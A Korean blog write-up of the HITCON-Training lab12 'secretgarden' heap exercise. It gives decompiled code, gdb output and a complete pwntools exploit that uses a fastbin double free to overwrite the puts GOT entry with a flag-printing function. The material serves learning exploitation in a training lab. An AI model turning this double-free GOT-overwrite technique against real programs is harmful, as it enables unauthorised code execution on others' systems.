---
layout: post
title: ! "[HITCON-Training] lab12-secretgarden"
excerpt_separator: <!--more-->
comments : true
tags:
  - Write-up
  - HITCON-Training
  - double free bug
  - heap
  - chaem
---

HITCON-Training이라는 15개의 문제가 있는 링크를 볼 수 있는데요!  
```
https://github.com/scwuaptx/HITCON-Training  
```
오늘 여기서 lab12에 대해 설명하려고 합니다.   
```
https://github.com/scwuaptx/HITCON-Training/tree/master/LAB/lab12  
```
<!--more-->

여기는 문제 코드, 바이너리, exploit이 모두 나와있어서 여러가지로 도움이 되었었습니다 ㅎㅎ  

이 문제는 `double free bug`로 chunk의 fd를 조작하여 puts함수로 system함수를 호출하는 문제입니다.  
우선 바이너리의 보호기법은 다음과 같습니다.  

```
pwndbg> checksec
[*] '/home/ubuntu/HITCON-Training/LAB/lab12/secretgarden'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

바이너리를 실행하면 다음과 같습니다.  

```
Starting program: /home/ubuntu/HITCON-Training/LAB/lab12/secretgarden

☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆
☆         Baby Secret Garden      ☆
☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆

  1 . Raise a flower
  2 . Visit the garden
  3 . Remove a flower from the garden
  4 . Clean the garden
  5 . Leave the garden

Your choice :
```

IDA를 이용해 main함수를 보면 메뉴와 함수가 다음과 같이 매칭되는 것을 알 수 있습니다.  

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf; // [rsp+10h] [rbp-20h]
  unsigned __int64 v4; // [rsp+28h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  init(*(_QWORD *)&argc, argv, envp);
  while ( 1 )
  {
    menu();
    read(0, &buf, 8uLL);
    switch ( atoi(&buf) )
    {
      case 1:
        add();
        break;
      case 2:
        visit(&buf, &buf);
        break;
      case 3:
        del();
        break;
      case 4:
        clean(&buf, &buf);
        break;
      case 5:
        puts("See you next time.");
        exit(0);
        return;
      default:
        puts("Invalid choice");
        break;
    }
  }
}
```

주요함수는 add와 del함수입니다.  
우선 add함수를 봅시다.  
이름의 길이를 입력받아 그만큼 malloc하는 것을 알 수 있습니다.  

```c
int add()
{
  void *v0; // rsi
  size_t size; // [rsp+0h] [rbp-20h]
  void *s; // [rsp+8h] [rbp-18h]
  void *buf; // [rsp+10h] [rbp-10h]
  unsigned __int64 v5; // [rsp+18h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  s = 0LL;
  buf = 0LL;
  LODWORD(size) = 0;
  if ( (unsigned int)flowercount > 0x63 )
    return puts("The garden is overflow");
  s = malloc(0x28uLL);
  memset(s, 0, 0x28uLL);
  printf("Length of the name :", 0LL, size);
  if ( (unsigned int)__isoc99_scanf("%u", &size) == -1 )
    exit(-1);
  buf = malloc((unsigned int)size);
  if ( !buf )
  {
    puts("Alloca error !!");
    exit(-1);
  }
  printf("The name of flower :", size);
  v0 = buf;
  read(0, buf, (unsigned int)size);
  *((_QWORD *)s + 1) = buf;
  printf("The color of the flower :", v0, size);
  __isoc99_scanf("%23s", (char *)s + 16);
  *(_DWORD *)s = 1;
  for ( HIDWORD(size) = 0; HIDWORD(size) <= 0x63; ++HIDWORD(size) )
  {
    if ( !*(&flowerlist + HIDWORD(size)) )
    {
      *(&flowerlist + HIDWORD(size)) = s;
      break;
    }
  }
  ++flowercount;
  return puts("Successful !");
}
```

여기서 할당하는 것의 구조는 다음과 같습니다.  

```c
struct flower{
	int vaild ;
	char *name ;
	char color[24] ;
};
```

그리고 del함수는 할당한 구조체의 name만 free해줍니다.  

```c
int del()
{
  int result; // eax
  unsigned int v1; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  if ( !flowercount )
    return puts("No flower in the garden");
  printf("Which flower do you want to remove from the garden:");
  __isoc99_scanf("%d", &v1);
  if ( v1 <= 0x63 && *(&flowerlist + v1) )
  {
    *(_DWORD *)*(&flowerlist + v1) = 0;
    free(*((void **)*(&flowerlist + v1) + 1));
    result = puts("Successful");
  }
  else
  {
    puts("Invalid choice");
    result = 0;
  }
  return result;
}
```

그리고 system을 출력해주는 magic함수가 있는 것을 알 수 있습니다.  
gdb를 이용해서 보면 magic함수의 주소는 0x400c7b입니다.  

```
pwndbg> disass magic
Dump of assembler code for function magic:
   0x0000000000400c7b <+0>:	push   rbp
   0x0000000000400c7c <+1>:	mov    rbp,rsp
   0x0000000000400c7f <+4>:	add    rsp,0xffffffffffffff80
   0x0000000000400c83 <+8>:	mov    rax,QWORD PTR fs:0x28
   0x0000000000400c8c <+17>:	mov    QWORD PTR [rbp-0x8],rax
   0x0000000000400c90 <+21>:	xor    eax,eax
   0x0000000000400c92 <+23>:	mov    esi,0x0
   0x0000000000400c97 <+28>:	mov    edi,0x4011c9
   0x0000000000400c9c <+33>:	mov    eax,0x0
   0x0000000000400ca1 <+38>:	call   0x400850 <open@plt>
   0x0000000000400ca6 <+43>:	mov    DWORD PTR [rbp-0x74],eax
   0x0000000000400ca9 <+46>:	lea    rcx,[rbp-0x70]
   0x0000000000400cad <+50>:	mov    eax,DWORD PTR [rbp-0x74]
   0x0000000000400cb0 <+53>:	mov    edx,0x64
   0x0000000000400cb5 <+58>:	mov    rsi,rcx
   0x0000000000400cb8 <+61>:	mov    edi,eax
   0x0000000000400cba <+63>:	call   0x400800 <read@plt>
   0x0000000000400cbf <+68>:	mov    eax,DWORD PTR [rbp-0x74]
   0x0000000000400cc2 <+71>:	mov    edi,eax
   0x0000000000400cc4 <+73>:	call   0x4007f0 <close@plt>
   0x0000000000400cc9 <+78>:	lea    rax,[rbp-0x70]
   0x0000000000400ccd <+82>:	mov    rsi,rax
   0x0000000000400cd0 <+85>:	mov    edi,0x4011e5
   0x0000000000400cd5 <+90>:	mov    eax,0x0
   0x0000000000400cda <+95>:	call   0x4007c0 <printf@plt>
   0x0000000000400cdf <+100>:	mov    edi,0x0
   0x0000000000400ce4 <+105>:	call   0x400880 <exit@plt>
End of assembler dump.
```  

puts함수의 인자로 magic함수를 호출해 줄 수 있는데, 이를 위해서는 puts함수의 got를 알아야합니다.  
deposit함수에서 사용되는 puts함수를 gdb로 보면 puts함수의 plt를 알 수 있습니다.  

```
0x0000000000400b7f <+377>:	call   0x4007a0 <puts@plt>
```

그리고 plt 주소를 다음과 같이 이용하여 got를 알 수 있습니다.  

```
pwndbg> x/3i 0x4007a0
   0x4007a0 <puts@plt>:	jmp    QWORD PTR [rip+0x20187a]        # 0x602020
   0x4007a6 <puts@plt+6>:	push   0x1
   0x4007ab <puts@plt+11>:	jmp    0x400780
```

puts함수의 got가 0x602020인 것을 알았으니, 이 주소에 magic함수의 주소값이 들어가도록 조정해주면됩니다.  

따라서 exploit은 다음과 같습니다.  

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

r = process('./secretgarden')

def raiseflower(length,name,color):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(length))
    r.recvuntil(":")
    r.sendline(name)
    r.recvuntil(":")
    r.sendline(color)

def visit():
    r.recvuntil(":")
    r.sendline("2")

def remove(idx):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))

def clean():
    r.recvuntil(":")
    r.sendline("4")


magic = 0x400c7b
fake_chunk = 0x601ffa
raiseflower(0x50,"da","red")#0
raiseflower(0x50,"da","red")#1
remove(0)
remove(1)
remove(0)
raiseflower(0x50,p64(fake_chunk),"blue")
raiseflower(0x50,"da","red")
raiseflower(0x50,"da","red")

raiseflower(0x50,"a"*6 + p64(0) + p64(magic)*2 ,"red")#malloc in fake_chunk

r.interactive()
```
